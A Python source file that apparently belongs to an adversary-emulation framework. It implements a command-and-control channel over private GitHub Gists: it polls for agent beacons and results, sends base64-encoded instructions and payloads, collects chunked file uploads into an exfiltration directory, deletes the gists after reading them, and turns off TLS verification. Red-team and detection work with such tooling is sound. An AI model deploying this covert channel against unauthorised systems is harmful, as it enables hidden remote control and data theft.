import aiohttp
import asyncio
import json
import os
import re
import uuid

from base64 import b64encode, b64decode
from collections import defaultdict

from app.utility.base_world import BaseWorld


def api_access(func):
    async def process(*args, **kwargs):
        async with aiohttp.ClientSession(headers=dict(Authorization='token {}'.format(args[0].token)),
                                         connector=aiohttp.TCPConnector(ssl=False)) as session:
            kwargs['session'] = session
            return await func(*args, **kwargs)
    return process


class Contact(BaseWorld):
    # Reference: https://github.blog/changelog/2021-03-31-authentication-token-format-updates-are-generally-available/
    VALID_TOKEN_FORMATS = ['^[a-fA-F0-9]{40,255}$', '^ghp_[A-Za-z0-9_]{36,251}$']

    class GistUpload:
        def __init__(self, upload_id, filename, num_chunks):
            self.upload_id = upload_id
            self.filename = filename
            self.chunks = [None]*num_chunks
            self.required_chunks = num_chunks
            self.completed_chunks = 0
            self.exported = False

        def add_chunk(self, chunk_index, contents):
            if self.chunks[chunk_index] is None:
                self.chunks[chunk_index] = contents
                self.completed_chunks += 1

        def is_complete(self):
            return self.completed_chunks == self.required_chunks

        def export_contents(self):
            self.exported = True
            return b''.join(self.chunks)

    def __init__(self, services):
        self.name = 'gist'
        self.description = 'Use gist for C2'
        self.file_svc = services.get('file_svc')
        self.contact_svc = services.get('contact_svc')
        self.log = self.create_logger('contact_gist')
        self.token = ''

        # Stores uploaded file chunks. Maps paw to dict that maps upload ID to GistUpload object
        self.pending_uploads = defaultdict(lambda: dict())

    def retrieve_config(self):
        return self.token

    async def start(self):
        token = self.get_config('app.contact.gist', '').strip()
        if token:
            if self.valid_config(token):
                self.token = token
                self.log.debug('Github Gist personal API token provided. Starting Gist C2 contact.')
                self._start_operation_loop()
            else:
                self.log.info('Invalid Github Gist personal API token provided. Gist C2 contact will not be started.')
        else:
            self.log.info('No Github Gist personal API token provided. Gist C2 contact will not be started.')

    def _start_operation_loop(self):
        loop = asyncio.get_event_loop()
        loop.create_task(self.gist_operation_loop())

    async def gist_operation_loop(self):
        while True:
            await self.handle_beacons(await self.get_results())
            await self.handle_beacons(await self.get_beacons())
            await self.handle_uploads(await self.get_uploads())
            await asyncio.sleep(15)

    def valid_config(self, token):
        return any(re.compile(pattern=token_regex).match(token) for token_regex in self.VALID_TOKEN_FORMATS)

    async def handle_beacons(self, beacons):
        """
        Handles various beacons types (beacon and results)
        """
        for beacon in beacons:
            beacon['contact'] = beacon.get('contact', self.name)
            agent, instructions = await self.contact_svc.handle_heartbeat(**beacon)
            await self._send_payloads(agent, instructions)
            await self._send_instructions(agent, instructions)

    async def get_results(self):
        """
        Retrieve all GIST posted results for a this C2's api token
        :return:
        """
        try:
            # Results are JSON dicts encoded in base64
            encoded_json_blobs = [g[0] for g in await self._get_gist_data(comm_type='results')]
            return [json.loads(self.file_svc.decode_bytes(blob)) for blob in encoded_json_blobs]
        except Exception as e:
            self.log.error('Retrieving results over c2 (%s) failed: %s' % (self.__class__.__name__, e))
            return []

    async def get_beacons(self):
        """
        Retrieve all GIST beacons for a particular api token
        :return: the beacons
        """
        try:
            # Beacons are JSON dicts encoded in base64
            b64_encoded_json_blobs = [g[0] for g in await self._get_gist_data(comm_type='beacon')]
            return [json.loads(self.file_svc.decode_bytes(blob)) for blob in b64_encoded_json_blobs]
        except Exception as e:
            self.log.error('Retrieving beacons over c2 (%s) failed: %s' % (self.__class__.__name__, e))
            return []

    async def handle_uploads(self, upload_gist_info):
        for upload in upload_gist_info:
            file_contents = upload[0]
            metadata = upload[1].split(':')
            paw_info = upload[2].split('-')
            if len(paw_info) < 2 or len(metadata) < 5:
                self.log.error('Parsing GIST upload data failed. Paw information not provided.')
                return
            paw = paw_info[1]
            upload_id = metadata[1]
            filename = self.file_svc.decode_bytes(metadata[2])
            curr_chunk = int(metadata[3])
            num_chunks = int(metadata[4])
            self.log.debug('Received uploaded file chunk %d out of %d for paw %s, upload ID %s, filename %s ' % (
                curr_chunk, num_chunks, paw, upload_id, filename
            ))
            await self._store_file_chunk(paw, upload_id, filename, file_contents, curr_chunk, num_chunks)
            if await self._ready_to_export(paw, upload_id):
                self.log.debug('Upload %s complete for paw %s, filename %s' % (upload_id, paw, filename))
                await self._submit_uploaded_file(paw, upload_id)

    async def get_uploads(self):
        """
        Retrieve all GIST posted file uploads for this C2's api token
        :return: list of (raw content, gist description, gist filename) tuples for upload GISTs
        """
        try:
            upload_gists = await self._get_gist_data(comm_type='upload')
            return [(b64decode(g[0]), g[2], g[3]) for g in upload_gists]
        except Exception as e:
            self.log.error('Receiving file uploads over c2 (%s) failed: %s' % (self.__class__.__name__, e))
            return []

    async def _send_instructions(self, agent, instructions):
        response = dict(paw=agent.paw,
                        sleep=await agent.calculate_sleep(),
                        watchdog=agent.watchdog,
                        instructions=json.dumps([json.dumps(i.display) for i in instructions]))
        if agent.pending_contact != agent.contact:
            response['new_contact'] = agent.pending_contact
            self.log.debug('Sending agent instructions to switch from C2 channel %s to %s' % (agent.contact, agent.pending_contact))
        if agent.executor_change_to_assign:
            response['executor_change'] = agent.assign_pending_executor_change()
            self.log.debug('Asking agent to update executor: %s', response.get('executor_change'))
        await self._post_instructions(self._encode_string(json.dumps(response).encode('utf-8')), agent.paw)

    async def _post_instructions(self, text, paw):
        try:
            if await self._wait_for_paw(paw, comm_type='instructions'):
                return
            return await self._post_gist(self._build_gist_content(comm_type='instructions', paw=paw,
                                                                  files={str(uuid.uuid4()): dict(content=text)}))
        except Exception as e:
            self.log.warning('Posting instructions over c2 (%s) failed!: %s' % (self.__class__.__name__, e))

    async def _send_payloads(self, agent, instructions):
        for i in instructions:
            for p in i.payloads:
                filename, payload_contents = await self._get_payload_content(p, agent)
                await self._post_payloads(filename, payload_contents, '%s-%s' % (agent.paw, filename))

    async def _post_payloads(self, filename, payload_contents, paw):
        try:
            files = {filename: dict(content=self._encode_string(payload_contents))}
            if len(files) < 1 or await self._wait_for_paw(paw, comm_type='payloads'):
                return
            return await self._post_gist(self._build_gist_content(comm_type='payloads', paw=paw, files=files))
        except Exception as e:
            self.log.warning('Posting payload over c2 (%s) failed! %s' % (self.__class__.__name__, e))

    async def _store_file_chunk(self, paw, upload_id, filename, contents, curr_chunk, total_chunks):
        pending_upload = self.pending_uploads[paw].get(upload_id)
        if not pending_upload:
            # starting brand new upload
            pending_upload = self.GistUpload(upload_id, filename, total_chunks)
            self.pending_uploads[paw][upload_id] = pending_upload
        pending_upload.add_chunk(curr_chunk - 1, contents)

    async def _ready_to_export(self, paw, upload_id):
        pending_upload = self.pending_uploads[paw].get(upload_id)
        return pending_upload is not None and pending_upload.is_complete() and not pending_upload.exported

    async def _submit_uploaded_file(self, paw, upload_id):
        upload_info = self.pending_uploads[paw].get(upload_id)
        if upload_info is not None:
            created_dir = os.path.normpath('/' + paw).lstrip('/')
            saveto_dir = await self.file_svc.create_exfil_sub_directory(dir_name=created_dir)
            unique_filename = ''.join([upload_info.filename, '-', upload_id[0:10]])
            await self.file_svc.save_file(unique_filename, upload_info.export_contents(), saveto_dir)
            self.log.debug('Uploaded file %s/%s' % (saveto_dir, upload_info.filename))

    async def _get_raw_gist_info(self, comm_type):
        """
        Returns list of (gist url, gist ID, gist description, gist filename) tuples for gists matching the comm type.
        """
        return [(g['files'][file]['raw_url'], g['id'], g['description'], g['files'][file]['filename'])
                for g in await self._get_gists() for file in g.get('files')
                if comm_type in g['description']]

    async def _get_gist_content(self, urls):
        return [await self._fetch_content(url) for url in urls]

    async def _wait_for_paw(self, paw, comm_type):
        for gist_content in await self._get_gists():
            if '{}-{}'.format(comm_type, paw) == gist_content['description']:
                return True
        return False

    async def _get_gist_data(self, comm_type):
        """
        Returns list of (gist content, gist ID, gist description, gist filename) tuples for gists matching the comm
        type.
        """
        gists = await self._get_raw_gist_info(comm_type=comm_type)
        gist_data = [(await self._fetch_content(g[0]), g[1], g[2], g[3]) for g in gists]
        await self._delete_gists(gist_ids=[g[1] for g in gists])
        return gist_data

    async def _get_payload_content(self, payload, beacon):
        if payload in self.file_svc.special_payloads:
            f = await self.file_svc.special_payloads[payload](dict(file=payload, platform=beacon['platform']))
            return await self.file_svc.read_file(f)
        return await self.file_svc.read_file(payload)

    @staticmethod
    def _build_gist_content(comm_type, paw, files):
        return dict(description='{}-{}'.format(comm_type, paw), public=False, files=files)

    @api_access
    async def _post_gist(self, gist_content, session):
        return await self._post(session, 'https://api.github.com/gists', body=gist_content)

    @api_access
    async def _get_gists(self, session):
        return json.loads(await self._fetch(session, 'https://api.github.com/gists'))

    @api_access
    async def _delete_gists(self, gist_ids, session):
        for _id in gist_ids:
            await self._delete(session, 'https://api.github.com/gists/{}'.format(_id))

    @api_access
    async def _fetch_content(self, url, session):
        return await self._fetch(session, url)

    @staticmethod
    async def _delete(session, url):
        async with session.delete(url) as response:
            return await response.text('ISO-8859-1')

    @staticmethod
    async def _fetch(session, url):
        async with session.get(url) as response:
            return await response.text()

    @staticmethod
    async def _post(session, url, body):
        async with session.post(url, json=body) as response:
            return await response.text()

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s), 'utf-8')
